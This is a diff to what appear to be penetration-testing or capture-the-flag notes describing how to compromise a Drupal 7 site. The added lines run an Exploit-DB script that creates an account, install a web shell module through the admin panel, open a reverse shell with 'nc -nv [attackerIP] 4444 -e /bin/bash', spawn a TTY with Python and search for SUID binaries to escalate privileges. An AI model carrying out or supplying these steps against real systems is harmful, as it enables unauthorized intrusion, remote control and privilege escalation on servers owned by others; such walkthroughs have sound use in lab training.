@@ -58,7 +58,26 @@ searchploit drupal 7 > result shows the exploit title and path
 # Launch the python script showed in searchploit to create user name and password
 python /usr/share/exploitdb/exploits/php/webapps/34992.py -u syberoffense -p Password123! -t http://[targetIP]
 
-# NOW, you can SSH to it as your new account and try escalating your access
+# NOW, you can SSH or login via browser to target with your new account and try escalating your access
+# Before logging in
+open browser > go to drupal.org/project/shell > scroll down to find the applied file > right click the zip file under 7.x > and hit copy link location
+
+# Now you can login and install the shell
+log in to web site using the created the account > navigate to "Modules" tab > paste in the install from a URL > click install
+
+# Enable the shell
+scroll down to the bottom > under "other' enable shell > scroll down some more to save configuration
+
+# Go the shell
+go back to "Dashboard" > in search box type "navigation" then click search > click link for shell
+
+# Establish reverse shell
+back to terminal > establish netcat listener "nc -lvp 4444" > back to browser type > nc -nv [attackerIP] 4444 -e /bin/bash > back to terminal
+
+# Use python script to establish shell then find any binaries with SUID
+in terminal type > python -c 'import pty; pty.spawn("/bin/bash")' > you'll get into $ > now for finding bins > find /-perm /4000
+
+
 
 
 
